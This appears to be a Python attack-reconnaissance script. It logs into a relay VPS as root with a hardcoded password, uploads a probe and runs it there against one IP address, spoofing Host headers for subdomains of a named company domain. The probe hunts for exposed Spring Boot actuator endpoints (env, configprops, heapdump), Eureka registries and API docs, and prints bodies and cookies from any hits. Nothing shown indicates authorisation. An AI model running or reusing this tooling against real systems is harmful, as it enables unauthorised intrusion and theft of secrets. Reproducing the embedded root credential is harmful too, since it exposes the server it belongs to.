import paramiko, sys

VPS = '64.177.88.10'
PASS = '5F.jyTK$D6%.F{a='

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(VPS, username='root', password=PASS, timeout=10)
    print('Connected to VPS', flush=True)
except Exception as e:
    print(f'SSH Error: {e}')
    sys.exit(1)

SCRIPT = r'''
import requests, urllib3, json, sys
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
IP = "35.238.21.37"

targets = [
    ("bff-origination-service.orquesta", [
        "/actuator/env", "/actuator/health", "/actuator/info",
        "/actuator/mappings", "/actuator/configprops", "/actuator",
        "/actuator/heapdump",
        "/swagger-ui/", "/swagger-ui/index.html",
        "/v2/api-docs", "/v3/api-docs",
        "/", "/login", "/api/", "/health",
    ]),
    ("orquesta", [
        "/actuator/env", "/actuator/health", "/eureka/apps",
        "/", "/swagger-ui/",
    ]),
    ("mpago", [
        "/actuator/env", "/actuator/health",
        "/", "/swagger-ui/", "/spei/", "/api/",
    ]),
    ("core", [
        "/actuator/env", "/actuator/health",
        "/", "/swagger-ui/",
    ]),
    ("eureka", [
        "/eureka/apps", "/eureka/", "/",
        "/actuator/env",
    ]),
    ("verificacion", [
        "/actuator/env", "/", "/swagger-ui/",
    ]),
    ("plataforma", [
        "/actuator/env", "/", "/swagger-ui/",
    ]),
    ("crm", [
        "/actuator/env", "/", "/swagger-ui/", "/api/",
    ]),
    ("web", [
        "/actuator/env", "/", "/swagger-ui/",
    ]),
    ("api", [
        "/actuator/env", "/actuator/health", "/",
        "/swagger-ui/", "/v2/api-docs", "/v3/api-docs",
    ]),
]

for sub, paths in targets:
    host = f"{sub}.calidad-architect.com"
    sys.stdout.write(f"\n=== {host} ===\n")
    sys.stdout.flush()
    for path in paths:
        for proto, port in [("https", 443), ("http", 80)]:
            url = f"{proto}://{IP}:{port}{path}"
            try:
                r = requests.get(
                    url,
                    headers={"Host": host, "User-Agent": UA, "Accept": "application/json,*/*"},
                    timeout=8, verify=False, allow_redirects=False
                )
                tag = ""
                if r.status_code == 200 and len(r.text) > 50:
                    tag = " *** HIT ***"
                elif r.status_code in (301, 302):
                    loc = r.headers.get("Location", "?")
                    tag = f" -> {loc}"
                sys.stdout.write(f"  [{r.status_code}] {proto}:{port}{path} ({len(r.text)}b){tag}\n")
                if tag == " *** HIT ***":
                    sys.stdout.write(f"    BODY: {repr(r.text[:500])}\n")
                    hdrs = {k: v for k, v in r.headers.items() if k.lower() in (
                        'server', 'x-powered-by', 'content-type', 'x-application-context',
                        'www-authenticate', 'set-cookie'
                    )}
                    if hdrs:
                        sys.stdout.write(f"    HEADERS: {json.dumps(hdrs)}\n")
                sys.stdout.flush()
            except requests.exceptions.ConnectTimeout:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except Exception as e:
                sys.stdout.write(f"  [ERR] {proto}:{port}{path} {e}\n")
                sys.stdout.flush()

sys.stdout.write("\n=== HEAPDUMP CHECK (bff only) ===\n")
sys.stdout.flush()
try:
    r = requests.get(
        f"https://{IP}:443/actuator/heapdump",
        headers={"Host": "bff-origination-service.orquesta.calidad-architect.com", "User-Agent": UA},
        timeout=15, verify=False, allow_redirects=False, stream=True
    )
    ct = r.headers.get("Content-Type", "?")
    cl = r.headers.get("Content-Length", "?")
    sys.stdout.write(f"  [{r.status_code}] CT={ct} CL={cl}\n")
    r.close()
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")
sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/probe_calidad.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Script uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/probe_calidad.py 2>&1', timeout=600)
out = stdout.read().decode(errors='replace')
err = stderr.read().decode(errors='replace')
print(out, flush=True)
if err:
    print('STDERR:', err, flush=True)
ssh.close()
print('Finished.', flush=True)
